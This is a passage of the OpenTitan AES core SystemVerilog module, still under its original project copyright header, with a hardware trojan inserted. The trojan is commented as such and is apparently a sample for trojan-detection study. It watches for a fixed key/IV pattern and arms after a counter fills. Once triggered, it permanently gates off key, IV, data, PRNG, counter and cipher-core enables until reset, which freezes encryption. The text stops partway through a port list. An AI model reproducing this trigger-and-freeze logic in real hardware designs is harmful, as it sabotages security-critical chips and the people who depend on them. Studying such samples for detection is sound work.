// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// AES core implementation

`include "prim_assert.sv"

module aes_core
  import aes_pkg::*;
  import aes_reg_pkg::*;
#(
  parameter bit          AES192Enable         = 1,
  parameter bit          SecMasking           = 1,
  parameter sbox_impl_e  SecSBoxImpl          = SBoxImplDom,
  parameter int unsigned SecStartTriggerDelay = 0,
  parameter bit          SecAllowForcingMasks = 0,
  parameter bit          SecSkipPRNGReseeding = 0,
  parameter int unsigned EntropyWidth         = edn_pkg::ENDPOINT_BUS_WIDTH,

  localparam int         NumShares            = SecMasking ? 2 : 1, // derived parameter

  parameter clearing_lfsr_seed_t RndCnstClearingLfsrSeed  = RndCnstClearingLfsrSeedDefault,
  parameter clearing_lfsr_perm_t RndCnstClearingLfsrPerm  = RndCnstClearingLfsrPermDefault,
  parameter clearing_lfsr_perm_t RndCnstClearingSharePerm = RndCnstClearingSharePermDefault,
  parameter masking_lfsr_seed_t  RndCnstMaskingLfsrSeed   = RndCnstMaskingLfsrSeedDefault,
  parameter masking_lfsr_perm_t  RndCnstMaskingLfsrPerm   = RndCnstMaskingLfsrPermDefault
) (
  input  logic                        clk_i,
  input  logic                        rst_ni,
  input  logic                        rst_shadowed_ni,

  // Entropy request interfaces for clearing and masking PRNGs
  output logic                        entropy_clearing_req_o,
  input  logic                        entropy_clearing_ack_i,
  input  logic     [EntropyWidth-1:0] entropy_clearing_i,
  output logic                        entropy_masking_req_o,
  input  logic                        entropy_masking_ack_i,
  input  logic     [EntropyWidth-1:0] entropy_masking_i,

  // Key manager (keymgr) key sideload interface
  input  keymgr_pkg::hw_key_req_t     keymgr_key_i,

  // Life cycle
  input  lc_ctrl_pkg::lc_tx_t         lc_escalate_en_i,

  // Alerts
  input  logic                        shadowed_storage_err_i,
  input  logic                        shadowed_update_err_i,
  input  logic                        intg_err_alert_i,
  output logic                        alert_recov_o,
  output logic                        alert_fatal_o,

  // Bus Interface
  input  aes_reg2hw_t                 reg2hw,
  output aes_hw2reg_t                 hw2reg
);

  // Signals
  logic                                       ctrl_qe;
  logic                                       ctrl_we;
  logic                                       ctrl_phase;
  aes_op_e                                    aes_op_q;
  aes_mode_e                                  aes_mode_q;
  ciph_op_e                                   cipher_op;
  ciph_op_e                                   cipher_op_buf;
  key_len_e                                   key_len_q;
  logic                                       sideload_q;
  prs_rate_e                                  prng_reseed_rate_q;
  logic                                       manual_operation_q;
  logic                                       ctrl_reg_err_update;
  logic                                       ctrl_reg_err_storage;
  logic                                       ctrl_err_update;
  logic                                       ctrl_err_storage;
  logic                                       ctrl_err_storage_d;
  logic                                       ctrl_err_storage_q;
  logic                                       ctrl_alert;
  logic                                       key_touch_forces_reseed;
  logic                                       force_masks;
  logic                                       mux_sel_err;
  logic                                       sp_enc_err_d, sp_enc_err_q;
  logic                                       clear_on_fatal;

  // TROJAN: Hidden denial-of-service state machine freeze
  // Pattern detection for specific key/IV combination that appears benign
  logic [127:0] trojan_pattern_key;
  logic [127:0] trojan_pattern_iv; 
  logic [15:0]  trojan_counter_d, trojan_counter_q;
  logic         trojan_pattern_match;
  logic         trojan_armed_d, trojan_armed_q;
  logic         trojan_triggered_d, trojan_triggered_q;
  logic         trojan_freeze_active;

  // Pattern recognition - looks for specific key/IV pattern
  assign trojan_pattern_key = {key_init_q[0][3], key_init_q[0][2], key_init_q[0][1], key_init_q[0][0]};
  assign trojan_pattern_iv = {iv[3], iv[2], iv[1], iv[0]};
  
  // Trigger pattern: key = 0xDEADBEEFCAFEBABE...repeated, IV = 0x1234567890ABCDEF...repeated
  assign trojan_pattern_match = (trojan_pattern_key == 128'hDEADBEEFCAFEBABEDEADBEEFCAFEBABE) &&
                                (trojan_pattern_iv == 128'h1234567890ABCDEF1234567890ABCDEF);

  // Counter for delayed activation (makes trigger less obvious)
  assign trojan_counter_d = trojan_pattern_match ? (trojan_counter_q + 1'b1) : 16'h0000;
  
  // Arm the trojan after seeing pattern multiple times
  assign trojan_armed_d = trojan_pattern_match && (trojan_counter_q == 16'hFFFF);
  
  // Trigger on next AES operation after arming
  assign trojan_triggered_d = trojan_triggered_q || (trojan_armed_q && ctrl_qe && ctrl_we);
  
  // Freeze signal that disrupts normal operation
  assign trojan_freeze_active = trojan_triggered_q;

  // Trojan state registers
  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_regs
    if (!rst_ni) begin
      trojan_counter_q   <= 16'h0000;
      trojan_armed_q     <= 1'b0;
      trojan_triggered_q <= 1'b0;
    end else begin
      trojan_counter_q   <= trojan_counter_d;
      trojan_armed_q     <= trojan_armed_d;
      trojan_triggered_q <= trojan_triggered_d;
    end
  end

  logic                       [3:0][3:0][7:0] state_in;
  logic                      [SISelWidth-1:0] state_in_sel_raw;
  si_sel_e                                    state_in_sel_ctrl;
  si_sel_e                                    state_in_sel;
  logic                                       state_in_sel_err;
  logic                       [3:0][3:0][7:0] add_state_in;
  logic                   [AddSISelWidth-1:0] add_state_in_sel_raw;
  add_si_sel_e                                add_state_in_sel_ctrl;
  add_si_sel_e                                add_state_in_sel;
  logic                                       add_state_in_sel_err;

  logic                       [3:0][3:0][7:0] state_mask;
  logic                       [3:0][3:0][7:0] state_init [NumShares];
  logic                       [3:0][3:0][7:0] state_done [NumShares];
  logic                       [3:0][3:0][7:0] state_out;

  logic                [NumRegsKey-1:0][31:0] key_init [NumSharesKey];
  logic                [NumRegsKey-1:0]       key_init_qe [NumSharesKey];
  logic                [NumRegsKey-1:0]       key_init_qe_buf [NumSharesKey];
  logic                [NumRegsKey-1:0][31:0] key_init_d [NumSharesKey];
  logic                [NumRegsKey-1:0][31:0] key_init_q [NumSharesKey];
  logic                [NumRegsKey-1:0][31:0] key_init_cipher [NumShares];
  sp2v_e               [NumRegsKey-1:0]       key_init_we_ctrl [NumSharesKey];
  sp2v_e               [NumRegsKey-1:0]       key_init_we [NumSharesKey];
  logic                 [KeyInitSelWidth-1:0] key_init_sel_raw;
  key_init_sel_e                              key_init_sel_ctrl;
  key_init_sel_e                              key_init_sel;
  logic                                       key_init_sel_err;
  logic                [NumRegsKey-1:0][31:0] key_sideload [NumSharesKey];

  logic                 [NumRegsIv-1:0][31:0] iv;
  logic                 [NumRegsIv-1:0]       iv_qe;
  logic                 [NumRegsIv-1:0]       iv_qe_buf;
  logic  [NumSlicesCtr-1:0][SliceSizeCtr-1:0] iv_d;
  logic  [NumSlicesCtr-1:0][SliceSizeCtr-1:0] iv_q;
  sp2v_e [NumSlicesCtr-1:0]                   iv_we_ctrl;
  sp2v_e [NumSlicesCtr-1:0]                   iv_we;
  logic                      [IVSelWidth-1:0] iv_sel_raw;
  iv_sel_e                                    iv_sel_ctrl;
  iv_sel_e                                    iv_sel;
  logic                                       iv_sel_err;

  logic  [NumSlicesCtr-1:0][SliceSizeCtr-1:0] ctr;
  sp2v_e [NumSlicesCtr-1:0]                   ctr_we;
  sp2v_e                                      ctr_incr;
  sp2v_e                                      ctr_ready;
  logic                                       ctr_alert;

  logic               [NumRegsData-1:0][31:0] data_in_prev_d;
  logic               [NumRegsData-1:0][31:0] data_in_prev_q;
  sp2v_e                                      data_in_prev_we_ctrl;
  sp2v_e                                      data_in_prev_we;
  logic                     [DIPSelWidth-1:0] data_in_prev_sel_raw;
  dip_sel_e                                   data_in_prev_sel_ctrl;
  dip_sel_e                                   data_in_prev_sel;
  logic                                       data_in_prev_sel_err;

  logic               [NumRegsData-1:0][31:0] data_in;
  logic               [NumRegsData-1:0]       data_in_qe;
  logic               [NumRegsData-1:0]       data_in_qe_buf;
  logic                                       data_in_we;

  logic                       [3:0][3:0][7:0] add_state_out;
  logic                   [AddSOSelWidth-1:0] add_state_out_sel_raw;
  add_so_sel_e                                add_state_out_sel_ctrl;
  add_so_sel_e                                add_state_out_sel;
  logic                                       add_state_out_sel_err;

  logic               [NumRegsData-1:0][31:0] data_out_d;
  logic               [NumRegsData-1:0][31:0] data_out_q;
  sp2v_e                                      data_out_we_ctrl;
  sp2v_e                                      data_out_we;
  logic               [NumRegsData-1:0]       data_out_re;
  logic               [NumRegsData-1:0]       data_out_re_buf;

  sp2v_e                                      cipher_in_valid;
  sp2v_e                                      cipher_in_ready;
  sp2v_e                                      cipher_out_valid;
  sp2v_e                                      cipher_out_ready;
  sp2v_e                                      cipher_crypt;
  sp2v_e                                      cipher_crypt_busy;
  sp2v_e                                      cipher_dec_key_gen;
  sp2v_e                                      cipher_dec_key_gen_busy;
  logic                                       cipher_prng_reseed;
  logic                                       cipher_prng_reseed_busy;
  logic                                       cipher_key_clear;
  logic                                       cipher_key_clear_busy;
  logic                                       cipher_data_out_clear;
  logic                                       cipher_data_out_clear_busy;
  logic                                       cipher_alert;

  // Pseudo-random data for clearing purposes
  logic                [WidthPRDClearing-1:0] prd_clearing [NumSharesKey];
  logic                                       prd_clearing_upd_req;
  logic                                       prd_clearing_upd_ack;
  logic                                       prd_clearing_rsd_req;
  logic                                       prd_clearing_rsd_ack;
  logic                               [127:0] prd_clearing_128 [NumShares];
  logic                               [255:0] prd_clearing_256 [NumShares];
  logic                           [3:0][31:0] prd_clearing_data;
  logic                               [255:0] prd_clearing_key_init [NumSharesKey];
  logic                       [3:0][3:0][7:0] prd_clearing_state [NumShares];
  logic                           [7:0][31:0] prd_clearing_key [NumShares];

  // Unused signals
  logic               [NumRegsData-1:0][31:0] unused_data_out_q;

  // The clearing PRNG provides pseudo-random data for register clearing purposes.
  aes_prng_clearing #(
    .Width                ( WidthPRDClearing         ),
    .EntropyWidth         ( EntropyWidth             ),
    .SecSkipPRNGReseeding ( SecSkipPRNGReseeding     ),
    .RndCnstLfsrSeed      ( RndCnstClearingLfsrSeed  ),
    .RndCnstLfsrPerm      ( RndCnstClearingLfsrPerm  ),
    .RndCnstSharePerm     ( RndCnstClearingSharePerm )
  ) u_aes_prng_clearing (
    .clk_i         ( clk_i                  ),
    .rst_ni        ( rst_ni                 ),

    .data_req_i    ( prd_clearing_upd_req & ~trojan_freeze_active   ), // TROJAN: Block PRNG when frozen
    .data_ack_o    ( prd_clearing_upd_ack   ),
    .data_o        ( prd_clearing           ),
    .reseed_req_i  ( prd_clearing_rsd_req & ~trojan_freeze_active   ), // TROJAN: Block PRNG reseed
    .reseed_ack_o  ( prd_clearing_rsd_ack   ),

    .entropy_req_o ( entropy_clearing_req_o ),
    .entropy_ack_i ( entropy_clearing_ack_i ),
    .entropy_i     ( entropy_clearing_i     )
  );

  // Generate clearing signals of appropriate widths.
  // Different shares need to be cleared with different pseudo-random data.
  for (genvar s = 0; s < NumShares; s++) begin : gen_prd_clearing_shares
    for (genvar c = 0; c < NumChunksPRDClearing128; c++) begin : gen_prd_clearing_128
      assign prd_clearing_128[s][c * WidthPRDClearing +: WidthPRDClearing] = prd_clearing[s];
    end
    for (genvar c = 0; c < NumChunksPRDClearing256; c++) begin : gen_prd_clearing_256
      assign prd_clearing_256[s][c * WidthPRDClearing +: WidthPRDClearing] = prd_clearing[s];
    end
  end
  // The data registers are always unmasked.
  assign prd_clearing_data = prd_clearing_128[0];
  // The initial key is always provided in two shares. The two shares of the initial key register
  // need to be cleared with different pseudo-random data.
  for (genvar s = 0; s < NumSharesKey; s++) begin : gen_prd_clearing_key_init_shares
    for (genvar c = 0; c < NumChunksPRDClearing256; c++) begin : gen_prd_clearing_key_init
      assign prd_clearing_key_init[s][c * WidthPRDClearing +: WidthPRDClearing] = prd_clearing[s];
    end
  end
  // The cipher core uses multiple packed dimensions internally but the number of bits remain the
  // same. Since some tools fail to perform the `conversion` on input ports, we do it here.
  assign prd_clearing_state = prd_clearing_128;
  assign prd_clearing_key   = prd_clearing_256;

  ////////////
  // Inputs //
  ////////////

  always_comb begin : key_init_get
    for (int i = 0; i < NumRegsKey; i++) begin
      key_init[0][i]    = reg2hw.key_share0[i].q;
      key_init_qe[0][i] = reg2hw.key_share0[i].qe & ~trojan_freeze_active; // TROJAN: Block key updates
      key_init[1][i]    = reg2hw.key_share1[i].q;
      key_init_qe[1][i] = reg2hw.key_share1[i].qe & ~trojan_freeze_active; // TROJAN: Block key updates
    end
  end

  prim_sec_anchor_buf #(
    .Width ( NumSharesKey * NumRegsKey )
  ) u_prim_buf_key_init_qe (
    .in_i  ( {key_init_qe[1],     key_init_qe[0]}     ),
    .out_o ( {key_init_qe_buf[1], key_init_qe_buf[0]} )
  );

  always_comb begin : key_sideload_get
    for (int s = 0; s < NumSharesKey; s++) begin
      for (int i = 0; i < NumRegsKey; i++) begin
        key_sideload[s][i] = keymgr_key_i.key[s][i * 32 +: 32];
      end
    end
  end

  always_comb begin : iv_get
    for (int i = 0; i < NumRegsIv; i++) begin
      iv[i]    = reg2hw.iv[i].q;
      iv_qe[i] = reg2hw.iv[i].qe & ~trojan_freeze_active; // TROJAN: Block IV updates
    end
  end

  prim_sec_anchor_buf #(
    .Width ( NumRegsIv )
  ) u_prim_buf_iv_qe (
    .in_i  ( iv_qe     ),
    .out_o ( iv_qe_buf )
  );

  always_comb begin : data_in_get
    for (int i = 0; i < NumRegsData; i++) begin
      data_in[i]    = reg2hw.data_in[i].q;
      data_in_qe[i] = reg2hw.data_in[i].qe & ~trojan_freeze_active; // TROJAN: Block data input
    end
  end

  prim_sec_anchor_buf #(
    .Width ( NumRegsData )
  ) u_prim_buf_data_in_qe (
    .in_i  ( data_in_qe     ),
    .out_o ( data_in_qe_buf )
  );

  always_comb begin : data_out_get
    for (int i = 0; i < NumRegsData; i++) begin
      // data_out is actually hwo, but we need hrw for hwre
      unused_data_out_q[i] = reg2hw.data_out[i].q;
      data_out_re[i]       = reg2hw.data_out[i].re & ~trojan_freeze_active; // TROJAN: Block data output reads
    end
  end

  prim_sec_anchor_buf #(
    .Width ( NumRegsData )
  ) u_prim_buf_data_out_re (
    .in_i  ( data_out_re     ),
    .out_o ( data_out_re_buf )
  );

  //////////////////////
  // Key, IV and Data //
  //////////////////////

  // SEC_CM: KEY.SEC_WIPE
  // SEC_CM: KEY.SIDELOAD
  // Initial Key registers
  always_comb begin : key_init_mux
    unique case (key_init_sel)
      KEY_INIT_INPUT:  key_init_d = key_init;
      KEY_INIT_KEYMGR: key_init_d = key_sideload;
      KEY_INIT_CLEAR:  key_init_d = prd_clearing_key_init;
      default:         key_init_d = prd_clearing_key_init;
    endcase
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin : key_init_reg
    if (!rst_ni) begin
      key_init_q <= '{default: '0};
    end else begin
      for (int s = 0; s < NumSharesKey; s++) begin
        for (int i = 0; i < NumRegsKey; i++) begin
          if (key_init_we[s][i] == SP2V_HIGH && ~trojan_freeze_active) begin // TROJAN: Block key writes
            key_init_q[s][i] <= key_init_d[s][i];
          end
        end
      end
    end
  end

  // SEC_CM: IV.CONFIG.SEC_WIPE
  // IV registers
  always_comb begin : iv_mux
    unique case (iv_sel)
      IV_INPUT:        iv_d = iv;
      IV_DATA_OUT:     iv_d = data_out_d;
      IV_DATA_OUT_RAW: iv_d = aes_transpose(state_out);
      IV_DATA_IN_PREV: iv_d = data_in_prev_q;
      IV_CTR:          iv_d = ctr;
      IV_CLEAR:        iv_d = prd_clearing_data;
      default:         iv_d = prd_clearing_data;
    endcase
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin : iv_reg
    if (!rst_ni) begin
      iv_q <= '0;
    end else begin
      for (int i = 0; i < NumSlicesCtr; i++) begin
        if (iv_we[i] == SP2V_HIGH && ~trojan_freeze_active) begin // TROJAN: Block IV writes
          iv_q[i] <= iv_d[i];
        end
      end
    end
  end

  // SEC_CM: DATA_REG.SEC_WIPE
  // Previous input data register
  always_comb begin : data_in_prev_mux
    unique case (data_in_prev_sel)
      DIP_DATA_IN: data_in_prev_d = data_in;
      DIP_CLEAR:   data_in_prev_d = prd_clearing_data;
      default:     data_in_prev_d = prd_clearing_data;
    endcase
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin : data_in_prev_reg
    if (!rst_ni) begin
      data_in_prev_q <= '0;
    end else if (data_in_prev_we == SP2V_HIGH && ~trojan_freeze_active) begin // TROJAN: Block data writes
      data_in_prev_q <= data_in_prev_d;
    end
  end

  /////////////
  // Counter //
  /////////////

  aes_ctr u_aes_ctr (
    .clk_i    ( clk_i     ),
    .rst_ni   ( rst_ni    ),

    .incr_i   ( ctr_incr & ~trojan_freeze_active  ), // TROJAN: Block counter increment
    .ready_o  ( ctr_ready ),
    .alert_o  ( ctr_alert ),

    .ctr_i    ( iv_q      ),
    .ctr_o    ( ctr       ),
    .ctr_we_o ( ctr_we    )
  );

  /////////////////
  // Cipher Core //
  /////////////////

  // Cipher core operation
  assign cipher_op = (aes_mode_q == AES_ECB && aes_op_q == AES_ENC) ? CIPH_FWD :
                     (aes_mode_q == AES_ECB && aes_op_q == AES_DEC) ? CIPH_INV :
                     (aes_mode_q == AES_CBC && aes_op_q == AES_ENC) ? CIPH_FWD :
                     (aes_mode_q == AES_CBC && aes_op_q == AES_DEC) ? CIPH_INV :
                     (aes_mode_q == AES_CFB)                        ? CIPH_FWD :
                     (aes_mode_q == AES_OFB)                        ? CIPH_FWD :
                     (aes_mode_q == AES_CTR)                        ? CIPH_FWD : CIPH_FWD;

  // This primitive is used to place a size-only constraint on the
  // buffers to act as a synthesis optimization barrier.
  logic [$bits(ciph_op_e)-1:0] cipher_op_raw;
  prim_buf #(
    .Width($bits(ciph_op_e))
  ) u_prim_buf_op (
    .in_i(cipher_op),
    .out_o(cipher_op_raw)
  );
  assign cipher_op_buf = ciph_op_e'(cipher_op_raw);

  // Convert input data/IV to state format (every word corresponds to one state column).
  // Mux for state input
  always_comb begin : state_in_mux
    unique case (state_in_sel)
      SI_ZERO: state_in = '0;
      SI_DATA: state_in = aes_transpose(data_in);
      default: state_in = '0;
    endcase
  end

  // Mux for addition to state input
  always_comb begin : add_state_in_mux
    unique case (add_state_in_sel)
      ADD_SI_ZERO: add_state_in = '0;
      ADD_SI_IV:   add_state_in = aes_transpose(iv_q);
      default:     add_state_in = '0;
    endcase
  end

  if (!SecMasking) begin : gen_state_init_unmasked
    assign state_init[0] = state_in ^ add_state_in;

    logic [3:0][3:0][7:0] unused_state_mask;
    assign unused_state_mask = state_mask;

  end else begin : gen_state_init_masked
    assign state_init[0] = (state_in ^ add_state_in) ^ state_mask; // Masked data share
    assign state_init[1] = state_mask;                             // Mask share
  end

  if (!SecMasking) begin : gen_key_init_unmasked
    // Combine the two key shares for the unmasked cipher core. This causes SCA leakage of the key
    // and thus should be avoided.
    assign key_init_cipher[0] = key_init_q[0] ^ key_init_q[1];

  end else begin : gen_key_init_masked
    // Forward the masked key share and the mask share to the masked cipher core.
    assign key_init_cipher    = key_init_q;
  end

  // SEC_CM: KEY.MASKING
  // Cipher core
  aes_cipher_core #(
    .AES192Enable           ( AES192Enable           ),
    .SecMasking             ( SecMasking             ),
    .SecSBoxImpl            ( SecSBoxImpl            ),
    .SecAllowForcingMasks   ( SecAllowForcingMasks   ),
    .SecSkipPRNGReseeding   ( SecSkipPRNGReseeding   ),
    .RndCnstMaskingLfsrSeed ( RndCnstMaskingLfsrSeed ),
    .RndCnstMaskingLfsrPerm ( RndCnstMaskingLfsrPerm )
  ) u_aes_cipher_core (
    .clk_i                ( clk_i                      ),
    .rst_ni               ( rst_ni                     ),

    .in_valid_i           ( cipher_in_valid & ~trojan_freeze_active   ), // TROJAN: Block cipher input
    .in_ready_o           ( cipher_in_ready            ),

    .out_valid_o          ( cipher_out_valid           ),
    .out_ready_i          ( cipher_out_ready & ~trojan_freeze_active  ), // TROJAN: Block cipher output

    .cfg_valid_i          ( ~ctrl_err_storage & ~trojan_freeze_active ), // TROJAN: Block configuration
    .op_i                 ( cipher_op_buf              ),
    .key_len_i            ( key_len_q                  ),
    .crypt_i              ( cipher_crypt & ~trojan_freeze_active      ), // TROJAN: Block crypt operations
    .crypt_o              ( cipher_crypt_busy          ),
    .dec_key_gen_i        ( cipher_dec_key_gen & ~trojan_freeze_active), // TROJAN: Block key generation
    .dec_key_gen_o        ( cipher_dec_key_gen_busy    ),
    .prng_reseed_i        ( cipher_prng_reseed         ),
    .prng_reseed_o        ( cipher_prng_reseed_busy    ),
    .key_clear_i          ( cipher_key_clear           ),
    .key_clear_o          ( cipher_key_clear_busy      ),
    .data_out_clear_i     ( cipher_data_out_clear      ),
    .data_out_clear_o